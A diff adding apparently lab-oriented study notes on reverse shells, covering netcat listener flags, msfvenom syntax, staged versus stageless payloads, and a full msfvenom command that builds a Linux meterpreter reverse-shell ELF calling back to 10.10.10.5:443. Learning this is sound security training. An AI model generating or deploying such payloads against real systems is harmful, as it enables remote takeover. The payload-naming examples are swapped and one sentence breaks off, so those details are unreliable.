@@ -47,3 +47,36 @@ Time to explain the `-lvnp` thing
  - v - verbose
  - n - host name resolution, `DNS`
  - p - port specification
+
+### msfvenome
+- used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal `shellcode` when developing something like a Buffer Overflow exploit.
+syntax:
+```zsh
+msfvenom -p <PAYLOAD> <OPTIONS>
+```
+
+#### Staged vs Stageless
+- _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually 
+    
+- _**Stageless**_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+
+#### payload naming convention 
+```
+<os>/<arch>/<payload>
+```
+
+- __ is used for ``stageless`` payloads. `windows/shell/bind_hidden_tcp`
+- / is used for staged ones. ` windows/shell_hidden_bind_tcp `
+
+> to list all available payloads we can use this `msfvenom --list payloads`
+
+Example:
+>  to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`
+>  we use the following command ...
+
+```zsh
+msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
+```
+
+### Metasploit multi/handler
+- tool for catching reverse shells. 
